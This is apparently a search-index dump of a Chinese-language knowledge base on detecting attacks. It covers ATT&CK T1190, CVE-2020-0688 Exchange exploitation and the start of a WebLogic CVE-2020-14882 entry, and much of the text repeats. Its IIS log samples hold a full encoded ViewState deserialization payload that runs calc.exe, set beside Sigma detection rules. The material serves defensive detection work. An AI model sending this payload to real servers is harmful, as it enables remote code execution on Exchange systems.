\u4f7f\u7528\u8f6f\u4ef6\uff0c\u6570\u636e\u6216\u547d\u4ee4\u6765\u5229\u7528\u9762\u5411Internet\u7684\u8ba1\u7b97\u673a\u7cfb\u7edf\u6216\u7a0b\u5e8f\u4e2d\u7684\u5f31\u70b9\uff0c\u4ece\u800c\u5bfc\u81f4\u610f\u5916\u6216\u65e0\u6cd5\u9884\u671f\u7684\u884c\u4e3a\u3002\u7cfb\u7edf\u7684\u5f31\u70b9\u53ef\u80fd\u662f\u9519\u8bef\u3001\u6545\u969c\u6216\u8bbe\u8ba1\u6f0f\u6d1e\u3002\u8fd9\u4e9b\u5e94\u7528\u7a0b\u5e8f\u901a\u5e38\u662f\u7f51\u7ad9\uff0c\u4f46\u662f\u53ef\u4ee5\u5305\u62ec\u6570\u636e\u5e93\uff08\u4f8b\u5982SQL\uff09\uff0c\u6807\u51c6\u670d\u52a1\uff08\u4f8b\u5982SMB \u6216SSH\uff09\u4ee5\u53ca\u5177\u6709Internet\u53ef\u8bbf\u95ee\u5f00\u653e\u7684\u4efb\u4f55\u5176\u4ed6\u5e94\u7528\u7a0b\u5e8f\uff0c\u4f8b\u5982Web\u670d\u52a1\u5668\u548c\u76f8\u5173\u670d\u52a1\u3002\u6839\u636e\u6240\u5229\u7528\u7684\u7f3a\u9677\uff0c\u8fd9\u53ef\u80fd\u5305\u62ec\u201c\u5229\u7528\u9632\u5fa1\u9632\u536b\u201d\u3002 \u5982\u679c\u5e94\u7528\u7a0b\u5e8f\u6258\u7ba1\u5728\u57fa\u4e8e\u4e91\u7684\u57fa\u7840\u67b6\u6784\u4e0a\uff0c\u5219\u5bf9\u5176\u8fdb\u884c\u5229\u7528\u53ef\u80fd\u4f1a\u5bfc\u81f4\u57fa\u7840\u5b9e\u9645\u5e94\u7528\u53d7\u5230\u635f\u5bb3\u3002\u8fd9\u53ef\u4ee5\u4f7f\u653b\u51fb\u8005\u83b7\u5f97\u8bbf\u95ee\u4e91API\u6216\u5229\u7528\u5f31\u8eab\u4efd\u548c\u8bbf\u95ee\u7ba1\u7406\u7b56\u7565\u7684\u8def\u5f84\u3002 \u5bf9\u4e8e\u7f51\u7ad9\u548c\u6570\u636e\u5e93\uff0cOWASP\u6392\u540d\u524d10\u4f4d\u548cCWE\u6392\u540d\u524d25\u4f4d\u7a81\u51fa\u4e86\u6700\u5e38\u89c1\u7684\u57fa\u4e8eWeb\u7684\u6f0f\u6d1e\u3002 CVE-2020-0688\u6f0f\u6d1e Microsoft Exchange Server\u662f\u5fae\u8f6f\u516c\u53f8\u4e00\u5957\u652f\u6301\u591a\u79cd\u7535\u5b50\u90ae\u4ef6\u7f51\u7edc\u534f\u8bae\u7684\u7535\u5b50\u90ae\u4ef6\u670d\u52a1\u7ec4\u4ef6\uff0c\u9664\u4f20\u7edf\u7684\u7535\u5b50\u90ae\u4ef6\u7684\u5b58\u53d6\u3001\u50a8\u5b58\u3001\u8f6c\u53d1\u4f5c\u7528\u5916\uff0c\u5728\u65b0\u7248\u672c\u7684\u4ea7\u54c1\u4e2d\u4ea6\u52a0\u5165\u4e86\u4e00\u7cfb\u5217\u8f85\u52a9\u529f\u80fd\uff0c\u5982\u8bed\u97f3\u90ae\u4ef6\u3001\u90ae\u4ef6\u8fc7\u6ee4\u7b5b\u9009\u548cOWA\uff08\u57fa\u4e8eWeb\u7684\u7535\u5b50\u90ae\u4ef6\u5b58\u53d6\uff09\u3002 \u6f0f\u6d1e\u8d77\u4e8eMicrosoft Exchange\u670d\u52a1\u5668\u5728\u5b89\u88c5\u65f6\u5e76\u6ca1\u6709\u6b63\u786e\u521b\u5efa\u552f\u4e00\u5bc6\u94a5\uff0c\u7ecf\u8fc7\u8eab\u4efd\u9a8c\u8bc1\u7684\u653b\u51fb\u8005\u53ef\u4ee5\u6b3a\u9a97\u76ee\u6807\u670d\u52a1\u5668\u53cd\u5e8f\u5217\u5316\u6076\u610f\u521b\u5efa\u7684ViewState\u6570\u636e\uff0c\u4f7f\u653b\u51fb\u8005\u53ef\u4ee5\u5728Exchange Control Panel web\u5e94\u7528\u4e0a\u6267\u884c\u4efb\u610f.net\u4ee3\u7801\u3002 \u6d4b\u8bd5\u6848\u4f8b \u5177\u4f53\u590d\u6d4b\u53ef\u4ee5\u53c2\u8003 CVE-2020-0688\uff1aExchange Server\u4f7f\u7528\u56fa\u5b9a\u52a0\u5bc6\u5bc6\u94a5\u8fdc\u7a0b\u4ee3\u7801\u6267\u884c\u6f0f\u6d1e\u4fee\u590d\u901a\u544a\uff1a https://www.anquanke.com/post/id/199772 CVE-2020-0688_\u5fae\u8f6fEXCHANGE\u670d\u52a1\u7684\u8fdc\u7a0b\u4ee3\u7801\u6267\u884c\u6f0f\u6d1e\u590d\u73b0\uff1a https://www.cnblogs.com/pt007/p/12394722.html \u68c0\u6d4b\u65e5\u5fd7 HTTP\u6d41\u91cf\u3001Windows sysmon\u65e5\u5fd7\u3001IIS\u65e5\u5fd7\u3001exchange\u65e5\u5fd7 \u6d4b\u8bd5\u590d\u73b0 \u53ef\u53c2\u8003\u4e0a\u8ff0\u6d4b\u8bd5\u6848\u4f8b \u6d4b\u8bd5\u7559\u75d5 HTTP\u6d41\u91cf\u68c0\u6d4b\u89c4\u5219\u57fa\u4e8epayload\u5173\u952e\u8bcd\u8fdb\u884c\u68c0\u6d4b Windows sysmon\u65e5\u5fd7\u68c0\u6d4b\u89c4\u5219\u57fa\u4e8epayload\u5173\u952e\u8bcd\u68c0\u6d4b IIS\u65e5\u5fd7\u68c0\u6d4b\u89c4\u5219\uff0c\u7559\u75d5\u5982\u4e0b\uff1a 2020-03-09 17:16:50 ::1 POST /owa/auth.owa &CorrelationID=<empty>;&cafeReqId=9cff6edd-19a9-43c0-bdd2-a94adef6dd0c; 443 HealthMailbox062c8b451f3a4e21aa98fd88e45f499e@mail163.com ::1 Mozilla/4.0+(compatible;+MSIE+9.0;+Windows+NT+6.1;+MSEXCHMON;+ACTIVEMONITORING;+OWACTP) - 302 0 0 0 2020-03-09 17:16:58 172.*.*.27 GET /ecp/default.aspx __VIEWSTATEGENERATOR=B97B4E27&__VIEWSTATE=%2FwEyhAYAAQAAAP%2F%2F%2F%2F8BAAAAAAAAAAwCAAAAXk1pY3Jvc29mdC5Qb3dlclNoZWxsLkVkaXRvciwgVmVyc2lvbj0zLjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPTMxYmYzODU2YWQzNjRlMzUFAQAAAEJNaWNyb3NvZnQuVmlzdWFsU3R1ZGlvLlRleHQuRm9ybWF0dGluZy5UZXh0Rm9ybWF0dGluZ1J1blByb3BlcnRpZXMBAAAAD0ZvcmVncm91bmRCcnVzaAECAAAABgMAAACmBDxSZXNvdXJjZURpY3Rpb25hcnkNCiAgeG1sbnM9Imh0dHA6Ly9zY2hlbWFzLm1pY3Jvc29mdC5jb20vd2luZngvMjAwNi94YW1sL3ByZXNlbnRhdGlvbiINCiAgeG1sbnM6eD0iaHR0cDovL3NjaGVtYXMubWljcm9zb2Z0LmNvbS93aW5meC8yMDA2L3hhbWwiDQogIHhtbG5zOlN5c3RlbT0iY2xyLW5hbWVzcGFjZTpTeXN0ZW07YXNzZW1ibHk9bXNjb3JsaWIiDQogIHhtbG5zOkRpYWc9ImNsci1uYW1lc3BhY2U6U3lzdGVtLkRpYWdub3N0aWNzO2Fzc2VtYmx5PXN5c3RlbSI%2BDQoJIDxPYmplY3REYXRhUHJvdmlkZXIgeDpLZXk9IiIgT2JqZWN0VHlwZSA9ICJ7IHg6VHlwZSBEaWFnOlByb2Nlc3N9IiBNZXRob2ROYW1lID0gIlN0YXJ0IiA%2BDQogICAgIDxPYmplY3REYXRhUHJvdmlkZXIuTWV0aG9kUGFyYW1ldGVycz4NCiAgICAgICAgPFN5c3RlbTpTdHJpbmc%2BY2FsYy5leGU8L1N5c3RlbTpTdHJpbmc%2BDQogICAgIDwvT2JqZWN0RGF0YVByb3ZpZGVyLk1ldGhvZFBhcmFtZXRlcnM%2BDQogICAgPC9PYmplY3REYXRhUHJvdmlkZXI%2BDQo8L1Jlc291cmNlRGljdGlvbmFyeT4LJ%2F5i3bVSrOTrkun3pNej4tluDK0%3D&CorrelationID=<empty>;&cafeReqId=e0874638-b142-4c77-84c1-c0434137e691; 443 limou 10.0.254.139 Mozilla/5.0+(Windows+NT+10.0;+Win64;+x64;+rv:73.0)+Gecko/20100101+Firefox/73.0 - 500 0 0 1502 \u68c0\u6d4b\u89c4\u5219/\u601d\u8def sigma\u89c4\u5219 title: CVE-2020-0688 Exchange Exploitation via Web Log id: fce2c2e2-0fb5-41ab-a14c-5391e1fd70a5 status: experimental description: Detects the exploitation of Microsoft Exchange vulnerability as described in CVE-2020-0688 references: - https://www.trustedsec.com/blog/detecting-cve-20200688-remote-code-execution-vulnerability-on-microsoft-exchange-server/ author: Florian Roth date: 2020/02/29 logsource: category: webserver detection: selection1: cs-method: 'GET' c-uri|contains: - '/ecp/' - '/owa/' selection2: c-uri|contains: '__VIEWSTATE=' condition: selection1 and selection2 fields: - c-ip - c-dns falsepositives: - Unknown tags: - attack.initial_access - attack.t1190 level: critical title: CVE-2020-0688 Exploitation via Eventlog id: d6266bf5-935e-4661-b477-78772735a7cb status: experimental description: Detects the exploitation of Microsoft Exchange vulnerability as described in CVE-2020-0688 references: - https://www.trustedsec.com/blog/detecting-cve-20200688-remote-code-execution-vulnerability-on-microsoft-exchange-server/ author: Florian Roth date: 2020/02/29 tags: - attack.initial_access - attack.t1190 logsource: product: windows service: application detection: selection1: EventID: 4 Source: MSExchange Control Panel Level: Error selection2: - '*&__VIEWSTATE=*' condition: selection1 and selection2 falsepositives: - Unknown level: high title: CVE-2020-0688 Exploitation IIS Eventlog id: d6266bf5-935e-4661-b477-78772735a7cb status: experimental description: Detects the exploitation of Microsoft Exchange vulnerability as described in CVE-2020-0688 references: - https://www.trustedsec.com/blog/detecting-cve-20200688-remote-code-execution-vulnerability-on-microsoft-exchange-server/ author: Florian Roth date: 2020/02/29 tags: - attack.initial_access - attack.t1190 logsource: product: windows service: IIS detection: selection1: cs-method: 'POST' c-uri|contains: '/owa/auth.owa' selection2: cs-method: 'GET' c-uri|contains: '__VIEWSTATEGENERATOR=* __VIEWSTATE=' timeframe: 3s #\u53ef\u6839\u636e\u5b9e\u9645\u60c5\u51b5\u8c03\u6574 condition: selection1 and selection2 falsepositives: - Unknown level: high \u5efa\u8bae \u6682\u65e0 \u53c2\u8003\u63a8\u8350 MITRE-ATT&CK-T1190 https://attack.mitre.org/techniques/T1190/ SIGMA rules https://github.com/Neo23x0/sigma/pull/644/files \u5728MICROSOFT EXCHANGE SERVER\u4e0a\u68c0\u6d4bCVE-2020-0688\u8fdc\u7a0b\u6267\u884c\u4ee3\u7801\u6f0f\u6d1e https://www.trustedsec.com/blog/detecting-cve-20200688-remote-code-execution-vulnerability-on-microsoft-exchange-server/","title":"T1190-CVE-2020-0688\u6f0f\u6d1e\u5229\u7528\u68c0\u6d4b"},{"location":"0x3_%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE/T1190-CVE-2020-0688-%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E6%A3%80%E6%B5%8B/#t1190-cve-2020-0688","text":"","title":"T1190-CVE-2020-0688\u6f0f\u6d1e\u5229\u7528\u68c0\u6d4b"},{"location":"0x3_%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE/T1190-CVE-2020-0688-%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E6%A3%80%E6%B5%8B/#attck","text":"\u4f7f\u7528\u8f6f\u4ef6\uff0c\u6570\u636e\u6216\u547d\u4ee4\u6765\u5229\u7528\u9762\u5411Internet\u7684\u8ba1\u7b97\u673a\u7cfb\u7edf\u6216\u7a0b\u5e8f\u4e2d\u7684\u5f31\u70b9\uff0c\u4ece\u800c\u5bfc\u81f4\u610f\u5916\u6216\u65e0\u6cd5\u9884\u671f\u7684\u884c\u4e3a\u3002\u7cfb\u7edf\u7684\u5f31\u70b9\u53ef\u80fd\u662f\u9519\u8bef\u3001\u6545\u969c\u6216\u8bbe\u8ba1\u6f0f\u6d1e\u3002\u8fd9\u4e9b\u5e94\u7528\u7a0b\u5e8f\u901a\u5e38\u662f\u7f51\u7ad9\uff0c\u4f46\u662f\u53ef\u4ee5\u5305\u62ec\u6570\u636e\u5e93\uff08\u4f8b\u5982SQL\uff09\uff0c\u6807\u51c6\u670d\u52a1\uff08\u4f8b\u5982SMB \u6216SSH\uff09\u4ee5\u53ca\u5177\u6709Internet\u53ef\u8bbf\u95ee\u5f00\u653e\u7684\u4efb\u4f55\u5176\u4ed6\u5e94\u7528\u7a0b\u5e8f\uff0c\u4f8b\u5982Web\u670d\u52a1\u5668\u548c\u76f8\u5173\u670d\u52a1\u3002\u6839\u636e\u6240\u5229\u7528\u7684\u7f3a\u9677\uff0c\u8fd9\u53ef\u80fd\u5305\u62ec\u201c\u5229\u7528\u9632\u5fa1\u9632\u536b\u201d\u3002 \u5982\u679c\u5e94\u7528\u7a0b\u5e8f\u6258\u7ba1\u5728\u57fa\u4e8e\u4e91\u7684\u57fa\u7840\u67b6\u6784\u4e0a\uff0c\u5219\u5bf9\u5176\u8fdb\u884c\u5229\u7528\u53ef\u80fd\u4f1a\u5bfc\u81f4\u57fa\u7840\u5b9e\u9645\u5e94\u7528\u53d7\u5230\u635f\u5bb3\u3002\u8fd9\u53ef\u4ee5\u4f7f\u653b\u51fb\u8005\u83b7\u5f97\u8bbf\u95ee\u4e91API\u6216\u5229\u7528\u5f31\u8eab\u4efd\u548c\u8bbf\u95ee\u7ba1\u7406\u7b56\u7565\u7684\u8def\u5f84\u3002 \u5bf9\u4e8e\u7f51\u7ad9\u548c\u6570\u636e\u5e93\uff0cOWASP\u6392\u540d\u524d10\u4f4d\u548cCWE\u6392\u540d\u524d25\u4f4d\u7a81\u51fa\u4e86\u6700\u5e38\u89c1\u7684\u57fa\u4e8eWeb\u7684\u6f0f\u6d1e\u3002","title":"\u6765\u81eaATT&amp;CK\u7684\u63cf\u8ff0"},{"location":"0x3_%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE/T1190-CVE-2020-0688-%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E6%A3%80%E6%B5%8B/#cve-2020-0688","text":"Microsoft Exchange Server\u662f\u5fae\u8f6f\u516c\u53f8\u4e00\u5957\u652f\u6301\u591a\u79cd\u7535\u5b50\u90ae\u4ef6\u7f51\u7edc\u534f\u8bae\u7684\u7535\u5b50\u90ae\u4ef6\u670d\u52a1\u7ec4\u4ef6\uff0c\u9664\u4f20\u7edf\u7684\u7535\u5b50\u90ae\u4ef6\u7684\u5b58\u53d6\u3001\u50a8\u5b58\u3001\u8f6c\u53d1\u4f5c\u7528\u5916\uff0c\u5728\u65b0\u7248\u672c\u7684\u4ea7\u54c1\u4e2d\u4ea6\u52a0\u5165\u4e86\u4e00\u7cfb\u5217\u8f85\u52a9\u529f\u80fd\uff0c\u5982\u8bed\u97f3\u90ae\u4ef6\u3001\u90ae\u4ef6\u8fc7\u6ee4\u7b5b\u9009\u548cOWA\uff08\u57fa\u4e8eWeb\u7684\u7535\u5b50\u90ae\u4ef6\u5b58\u53d6\uff09\u3002 \u6f0f\u6d1e\u8d77\u4e8eMicrosoft Exchange\u670d\u52a1\u5668\u5728\u5b89\u88c5\u65f6\u5e76\u6ca1\u6709\u6b63\u786e\u521b\u5efa\u552f\u4e00\u5bc6\u94a5\uff0c\u7ecf\u8fc7\u8eab\u4efd\u9a8c\u8bc1\u7684\u653b\u51fb\u8005\u53ef\u4ee5\u6b3a\u9a97\u76ee\u6807\u670d\u52a1\u5668\u53cd\u5e8f\u5217\u5316\u6076\u610f\u521b\u5efa\u7684ViewState\u6570\u636e\uff0c\u4f7f\u653b\u51fb\u8005\u53ef\u4ee5\u5728Exchange Control Panel web\u5e94\u7528\u4e0a\u6267\u884c\u4efb\u610f.net\u4ee3\u7801\u3002","title":"CVE-2020-0688\u6f0f\u6d1e"},{"location":"0x3_%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE/T1190-CVE-2020-0688-%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E6%A3%80%E6%B5%8B/#_1","text":"\u5177\u4f53\u590d\u6d4b\u53ef\u4ee5\u53c2\u8003 CVE-2020-0688\uff1aExchange Server\u4f7f\u7528\u56fa\u5b9a\u52a0\u5bc6\u5bc6\u94a5\u8fdc\u7a0b\u4ee3\u7801\u6267\u884c\u6f0f\u6d1e\u4fee\u590d\u901a\u544a\uff1a https://www.anquanke.com/post/id/199772 CVE-2020-0688_\u5fae\u8f6fEXCHANGE\u670d\u52a1\u7684\u8fdc\u7a0b\u4ee3\u7801\u6267\u884c\u6f0f\u6d1e\u590d\u73b0\uff1a https://www.cnblogs.com/pt007/p/12394722.html","title":"\u6d4b\u8bd5\u6848\u4f8b"},{"location":"0x3_%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE/T1190-CVE-2020-0688-%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E6%A3%80%E6%B5%8B/#_2","text":"HTTP\u6d41\u91cf\u3001Windows sysmon\u65e5\u5fd7\u3001IIS\u65e5\u5fd7\u3001exchange\u65e5\u5fd7","title":"\u68c0\u6d4b\u65e5\u5fd7"},{"location":"0x3_%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE/T1190-CVE-2020-0688-%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E6%A3%80%E6%B5%8B/#_3","text":"\u53ef\u53c2\u8003\u4e0a\u8ff0\u6d4b\u8bd5\u6848\u4f8b","title":"\u6d4b\u8bd5\u590d\u73b0"},{"location":"0x3_%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE/T1190-CVE-2020-0688-%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E6%A3%80%E6%B5%8B/#_4","text":"HTTP\u6d41\u91cf\u68c0\u6d4b\u89c4\u5219\u57fa\u4e8epayload\u5173\u952e\u8bcd\u8fdb\u884c\u68c0\u6d4b Windows sysmon\u65e5\u5fd7\u68c0\u6d4b\u89c4\u5219\u57fa\u4e8epayload\u5173\u952e\u8bcd\u68c0\u6d4b IIS\u65e5\u5fd7\u68c0\u6d4b\u89c4\u5219\uff0c\u7559\u75d5\u5982\u4e0b\uff1a 2020-03-09 17:16:50 ::1 POST /owa/auth.owa &CorrelationID=<empty>;&cafeReqId=9cff6edd-19a9-43c0-bdd2-a94adef6dd0c; 443 HealthMailbox062c8b451f3a4e21aa98fd88e45f499e@mail163.com ::1 Mozilla/4.0+(compatible;+MSIE+9.0;+Windows+NT+6.1;+MSEXCHMON;+ACTIVEMONITORING;+OWACTP) - 302 0 0 0 2020-03-09 17:16:58 172.*.*.27 GET /ecp/default.aspx __VIEWSTATEGENERATOR=B97B4E27&__VIEWSTATE=%2FwEyhAYAAQAAAP%2F%2F%2F%2F8BAAAAAAAAAAwCAAAAXk1pY3Jvc29mdC5Qb3dlclNoZWxsLkVkaXRvciwgVmVyc2lvbj0zLjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPTMxYmYzODU2YWQzNjRlMzUFAQAAAEJNaWNyb3NvZnQuVmlzdWFsU3R1ZGlvLlRleHQuRm9ybWF0dGluZy5UZXh0Rm9ybWF0dGluZ1J1blByb3BlcnRpZXMBAAAAD0ZvcmVncm91bmRCcnVzaAECAAAABgMAAACmBDxSZXNvdXJjZURpY3Rpb25hcnkNCiAgeG1sbnM9Imh0dHA6Ly9zY2hlbWFzLm1pY3Jvc29mdC5jb20vd2luZngvMjAwNi94YW1sL3ByZXNlbnRhdGlvbiINCiAgeG1sbnM6eD0iaHR0cDovL3NjaGVtYXMubWljcm9zb2Z0LmNvbS93aW5meC8yMDA2L3hhbWwiDQogIHhtbG5zOlN5c3RlbT0iY2xyLW5hbWVzcGFjZTpTeXN0ZW07YXNzZW1ibHk9bXNjb3JsaWIiDQogIHhtbG5zOkRpYWc9ImNsci1uYW1lc3BhY2U6U3lzdGVtLkRpYWdub3N0aWNzO2Fzc2VtYmx5PXN5c3RlbSI%2BDQoJIDxPYmplY3REYXRhUHJvdmlkZXIgeDpLZXk9IiIgT2JqZWN0VHlwZSA9ICJ7IHg6VHlwZSBEaWFnOlByb2Nlc3N9IiBNZXRob2ROYW1lID0gIlN0YXJ0IiA%2BDQogICAgIDxPYmplY3REYXRhUHJvdmlkZXIuTWV0aG9kUGFyYW1ldGVycz4NCiAgICAgICAgPFN5c3RlbTpTdHJpbmc%2BY2FsYy5leGU8L1N5c3RlbTpTdHJpbmc%2BDQogICAgIDwvT2JqZWN0RGF0YVByb3ZpZGVyLk1ldGhvZFBhcmFtZXRlcnM%2BDQogICAgPC9PYmplY3REYXRhUHJvdmlkZXI%2BDQo8L1Jlc291cmNlRGljdGlvbmFyeT4LJ%2F5i3bVSrOTrkun3pNej4tluDK0%3D&CorrelationID=<empty>;&cafeReqId=e0874638-b142-4c77-84c1-c0434137e691; 443 limou 10.0.254.139 Mozilla/5.0+(Windows+NT+10.0;+Win64;+x64;+rv:73.0)+Gecko/20100101+Firefox/73.0 - 500 0 0 1502","title":"\u6d4b\u8bd5\u7559\u75d5"},{"location":"0x3_%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE/T1190-CVE-2020-0688-%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E6%A3%80%E6%B5%8B/#_5","text":"","title":"\u68c0\u6d4b\u89c4\u5219/\u601d\u8def"},{"location":"0x3_%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE/T1190-CVE-2020-0688-%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E6%A3%80%E6%B5%8B/#sigma","text":"title: CVE-2020-0688 Exchange Exploitation via Web Log id: fce2c2e2-0fb5-41ab-a14c-5391e1fd70a5 status: experimental description: Detects the exploitation of Microsoft Exchange vulnerability as described in CVE-2020-0688 references: - https://www.trustedsec.com/blog/detecting-cve-20200688-remote-code-execution-vulnerability-on-microsoft-exchange-server/ author: Florian Roth date: 2020/02/29 logsource: category: webserver detection: selection1: cs-method: 'GET' c-uri|contains: - '/ecp/' - '/owa/' selection2: c-uri|contains: '__VIEWSTATE=' condition: selection1 and selection2 fields: - c-ip - c-dns falsepositives: - Unknown tags: - attack.initial_access - attack.t1190 level: critical title: CVE-2020-0688 Exploitation via Eventlog id: d6266bf5-935e-4661-b477-78772735a7cb status: experimental description: Detects the exploitation of Microsoft Exchange vulnerability as described in CVE-2020-0688 references: - https://www.trustedsec.com/blog/detecting-cve-20200688-remote-code-execution-vulnerability-on-microsoft-exchange-server/ author: Florian Roth date: 2020/02/29 tags: - attack.initial_access - attack.t1190 logsource: product: windows service: application detection: selection1: EventID: 4 Source: MSExchange Control Panel Level: Error selection2: - '*&__VIEWSTATE=*' condition: selection1 and selection2 falsepositives: - Unknown level: high title: CVE-2020-0688 Exploitation IIS Eventlog id: d6266bf5-935e-4661-b477-78772735a7cb status: experimental description: Detects the exploitation of Microsoft Exchange vulnerability as described in CVE-2020-0688 references: - https://www.trustedsec.com/blog/detecting-cve-20200688-remote-code-execution-vulnerability-on-microsoft-exchange-server/ author: Florian Roth date: 2020/02/29 tags: - attack.initial_access - attack.t1190 logsource: product: windows service: IIS detection: selection1: cs-method: 'POST' c-uri|contains: '/owa/auth.owa' selection2: cs-method: 'GET' c-uri|contains: '__VIEWSTATEGENERATOR=* __VIEWSTATE=' timeframe: 3s #\u53ef\u6839\u636e\u5b9e\u9645\u60c5\u51b5\u8c03\u6574 condition: selection1 and selection2 falsepositives: - Unknown level: high","title":"sigma\u89c4\u5219"},{"location":"0x3_%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE/T1190-CVE-2020-0688-%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E6%A3%80%E6%B5%8B/#_6","text":"\u6682\u65e0","title":"\u5efa\u8bae"},{"location":"0x3_%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE/T1190-CVE-2020-0688-%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E6%A3%80%E6%B5%8B/#_7","text":"MITRE-ATT&CK-T1190 https://attack.mitre.org/techniques/T1190/ SIGMA rules https://github.com/Neo23x0/sigma/pull/644/files \u5728MICROSOFT EXCHANGE SERVER\u4e0a\u68c0\u6d4bCVE-2020-0688\u8fdc\u7a0b\u6267\u884c\u4ee3\u7801\u6f0f\u6d1e https://www.trustedsec.com/blog/detecting-cve-20200688-remote-code-execution-vulnerability-on-microsoft-exchange-server/","title":"\u53c2\u8003\u63a8\u8350"},{"location":"0x3_%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE/T1190-CVE-2020-14882-Weblogic%20Console%20HTTP%20%E5%8D%8F%E8%AE%AE%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/","text":"T1190-CVE-2020-14882-Weblogic Console HTTP \u534f\u8bae\u8fdc\u7a0b\u4ee3\u7801\u6267\u884c\u6f0f\u6d1e \u6765\u81eaATT&CK\u7684\u63cf\u8ff0 \u4f7f\u7528\u8f6f\u4ef6\uff0c\u6570\u636e\u6216\u547d\u4ee4\u6765\u5229\u7528\u9762\u5411Internet\u7684\u8ba1\u7b97\u673a\u7cfb\u7edf\u6216\u7a0b\u5e8f\u4e2d\u7684\u5f31\u70b9\uff0c\u4ece\u800c\u5bfc\u81f4\u610f\u5916\u6216\u65e0\u6cd5\u9884\u671f\u7684\u884c\u4e3a\u3002\u7cfb\u7edf\u7684\u5f31\u70b9\u53ef\u80fd\u662f\u9519\u8bef\u3001\u6545\u969c\u6216\u8bbe\u8ba1\u6f0f\u6d1e\u3002\u8fd9\u4e9b\u5e94\u7528\u7a0b\u5e8f\u901a\u5e38\u662f\u7f51\u7ad9\uff0c\u4f46\u662f\u53ef\u4ee5\u5305\u62ec\u6570\u636e\u5e93\uff08\u4f8b\u5982SQL\uff09\uff0c\u6807\u51c6\u670d\u52a1\uff08\u4f8b\u5982SMB \u6216SSH\uff09\u4ee5\u53ca\u5177\u6709Internet\u53ef\u8bbf\u95ee\u5f00\u653e\u7684\u4efb\u4f55\u5176\u4ed6\u5e94\u7528\u7a0b\u5e8f\uff0c\u4f8b\u5982Web\u670d\u52a1\u5668\u548c\u76f8\u5173\u670d\u52a1\u3002\u6839\u636e\u6240\u5229\u7528\u7684\u7f3a\u9677\uff0c\u8fd9\u53ef\u80fd\u5305\u62ec\u201c\u5229\u7528\u9632\u5fa1\u9632\u536b\u201d\u3002 \u5982\u679c\u5e94\u7528\u7a0b\u5e8f\u6258\u7ba1\u5728\u57fa\u4e8e\u4e91\u7684\u57fa\u7840\u67b6\u6784\u4e0a\uff0c\u5219\u5bf9\u5176\u8fdb\u884c\u5229\u7528\u53ef\u80fd\u4f1a\u5bfc\u81f4\u57fa\u7840\u5b9e\u9645\u5e94\u7528\u53d7\u5230\u635f\u5bb3\u3002\u8fd9\u53ef\u4ee5\u4f7f\u653b\u51fb\u8005\u83b7\u5f97\u8bbf\u95ee\u4e91API\u6216\u5229\u7528\u5f31\u8eab\u4efd\u548c\u8bbf\u95ee\u7ba1\u7406\u7b56\u7565\u7684\u8def\u5f84\u3002 \u5bf9\u4e8e\u7f51\u7ad9\u548c\u6570\u636e\u5e93\uff0cOWASP\u6392\u540d\u524d10\u4f4d\u548cCWE\u6392\u540d\u524d25\u4f4d\u7a81\u51fa\u4e86\u6700\u5e38\u89c1\u7684\u57fa\u4e8eWeb\u7684\u6f0f\u6d1e\u3002 \u6d4b\u8bd5\u6848\u4f8b Weblogic\u662fOracle\u516c\u53f8\u63a8\u51fa\u7684J2EE\u5e94\u7528\u670d\u52a1\u5668\uff0cCVE-2020-14882\u5141\u8bb8\u672a\u6388\u6743\u7684\u7528\u6237\u7ed5\u8fc7\u7ba1\u7406\u63a7\u5236\u53f0\u7684\u6743\u9650\u9a8c\u8bc1\u8bbf\u95ee\u540e\u53f0\uff0cCVE-2020-14883\u5141\u8bb8\u540e\u53f0\u4efb\u610f\u7528\u6237\u901a\u8fc7HTTP\u534f\u8bae\u6267\u884c\u4efb\u610f\u547d\u4ee4\u3002\u4f7f\u7528\u8fd9\u4e24\u4e2a\u6f0f\u6d1e\u7ec4\u6210\u7684\u5229\u7528\u94fe\uff0c\u53ef\u901a\u8fc7\u4e00\u4e2aGET\u8bf7\u6c42\u5728\u8fdc\u7a0bWeblogic\u670d\u52a1\u5668\u4e0a\u4ee5\u672a\u6388\u6743\u7684\u4efb\u610f\u7528\u6237\u8eab\u4efd\u6267\u884c\u547d\u4ee4\u3002 0x1 \u5f71\u54cd\u7248\u672c Oracle:Weblogic : 10.3.6.0.0, 12.1.3.0.0, 12.2.1.3.0, 12.2.1.4.0, 14.1.1.0.0 0x2 \u6f0f\u6d1e\u8be6\u60c5 \u53ef\u53c2\u8003\uff1a https://www.cnblogs.com/2rsh0u/p/13911794.html # Weblogic\u672a\u6388\u6743\u8fdc\u7a0b\u547d\u4ee4\u6267\u884c\u6f0f\u6d1e\uff08CVE-2020-14882&CVE-2020-14883\uff09\u590d\u73b0 https://www.cnblogs.com/potatsoSec/p/13895120.html # CVE-2020-14882 weblogic \u672a\u6388\u6743\u547d\u4ee4\u6267\u884c\u590d\u73b0 \u68c0\u6d4b\u65e5\u5fd7 HTTP.log \u6d4b\u8bd5\u590d\u73b0 